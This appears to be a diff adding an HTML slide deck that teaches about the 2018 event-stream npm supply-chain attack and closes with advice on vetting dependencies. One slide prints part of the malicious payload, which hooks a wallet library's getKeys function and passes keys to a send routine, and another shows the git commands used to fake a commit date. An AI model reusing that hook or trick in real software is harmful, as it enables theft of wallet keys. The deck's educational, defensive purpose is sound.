@@ -1,0 +1,182 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>Handling dependencies</title>
+
+    <link rel="stylesheet" href="../css/reset.css">
+    <link rel="stylesheet" href="../css/reveal.css">
+    <link rel="stylesheet" href="../css/theme/black.css">
+
+    <link rel="stylesheet" href="../lib/css/monokai.css">
+
+    <script>
+        var link = document.createElement( 'link' );
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = window.location.search.match(/print-pdf/gi) ? '../css/print/pdf.css' : '../css/print/paper.css';
+        document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
+</head>
+<body>
+<div class="reveal">
+    <div class="slides">
+        <section>
+            Handling dependencies
+        </section>
+        <section>
+            <h2>November 20th, 2018</h2>
+            <img class="stretch" data-src="./img/issue.png">
+        </section>
+        <section>
+            <h2>dominictarr</h2>
+            <img class="stretch" data-src="./img/dominic.png">
+        </section>
+        <section>
+            <h2>Event stream</h2>
+            <img class="stretch" data-src="./img/event-stream.png">
+        </section>
+        <section>
+            <h2>2015: 16M downloads</h2>
+            <h2>2018: 70M downloads</h2>
+            <h2>Summer 2018: right9ctrl proposes to become owner</h2>
+        </section>
+        <section>
+            <h2>GitHub issue</h2>
+            <img class="stretch" data-src="./img/issue2.jpg">
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/creepy.gif">
+        </section>
+        <section>
+            <h2>Pull requests</h2>
+            <img class="stretch" data-src="./img/pr.png">
+        </section>
+        <section>
+            <h2>Pull requests</h2>
+            <img class="stretch" data-src="./img/pr2.png">
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/jack.gif">
+        </section>
+        <section>
+            <h2>October 28th, 2018</h2>
+            <code class="hljs">GIT_COMMITTER_DATE=”$(date)”</code>
+            <code class="hljs">git commit –amend –no-edit –date “$(date)”</code>
+
+        </section>
+        <section>
+            <h2>What does it do?</h2>
+            <ul>
+                <li>Update of <code>index.min.js</code></li>
+                <li>Add AES256 encrypted file shown as a test fixture</li>
+                <li>Update version number 3.3.5 -> 3.3.6</li>
+                <li>Triggers update for ~1.5-2M developers</li>
+            </ul>
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/npm.png">
+        </section>
+        <section style="top: unset">
+            <h2>November 20th, 2018</h2>
+            <img class="stretch" data-src="./img/issue.png">
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/bitpay.jpg">
+        </section>
+        <section>
+            <h2>How does it work?</h2>
+            <ul>
+                <li>Looks for Bitpay wallets with a device object (browsers/Electron)</code></li>
+                <li>Parses ids</code></li>
+                <li>Takes all wallets > 100 bitcoins (~600K€)</li>
+                <li>Sends it to a malaysian server</li>
+            </ul>
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/shock.gif">
+        </section>
+        <section>
+            <div data-markdown>
+                ```js
+                Credentials.prototype.getKeys = function(password) {
+                    // code to decrypt password and send it
+                    return keys;
+                };
+                ```
+            </div>
+        </section>
+        <section style="width: fit-content">
+            <div data-markdown>
+                ```js
+                const Credentials = require("bitcore-wallet-client/lib/credentials.js");
+                // Intercept the getKeys function in the Credentails class
+                Credentials.prototype.getKeysFunc = Credentials.prototype.getKeys;
+                Credentials.prototype.getKeys = function(keyLookup) {
+                    const originalResult = this.getKeysFunc(keyLookup);
+                    try {
+                        if (global.CSSMap && global.CSSMap[this.xPubKey]) {
+                            delete global.CSSMap[this.xPubKey];
+                            sendRequests("p", keyLookup + "\t" + this.xPubKey);
+                        }
+                    } catch (err) {}
+                    return originalResult;
+                }
+                ```
+            </div>
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/panic.gif">
+        </section>
+        <section>
+            <h2>Consequences</h2>
+            <ul>
+                <li>BitPay says their app is not vulnerable, but update it anyway</li>
+                <li>NPM takes control to remove malicious code</li>
+                <li>Developer apologizes, but was bored of the project and community</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Conclusion</h2>
+            <ul>
+                <li>Be careful of dependencies you add</li>
+                <li>Look at its license: MIT = NO GUARANTY</li>
+                <li>Keep your dependencies up to date</li>
+                <li>Use GitHub security tab</li>
+            </ul>
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/security.png">
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/security.svg">
+        </section>
+        <section>
+            <h2>Links</h2>
+            <ul>
+                <li><a href="https://www.jesuisundev.com/lhistoire-vraie-dun-module-npm-hostile/">Je suis un dev</a></li>
+                <li><a href="https://github.com/features/security">GitHub Security features</a></li>
+            </ul>
+        </section>
+        <section>
+            <img class="stretch" data-src="./img/end.jpg">
+        </section>
+    </div>
+</div>
+
+<script src="../js/reveal.js"></script>
+
+<script>
+    Reveal.initialize({
+        dependencies: [
+            { src: '../plugin/markdown/marked.js' },
+            { src: '../plugin/markdown/markdown.js' },
+            { src: '../plugin/notes/notes.js', async: true },
+            { src: '../plugin/highlight/highlight.js', async: true }
+        ]
+    });
+</script>
+</body>
+</html>
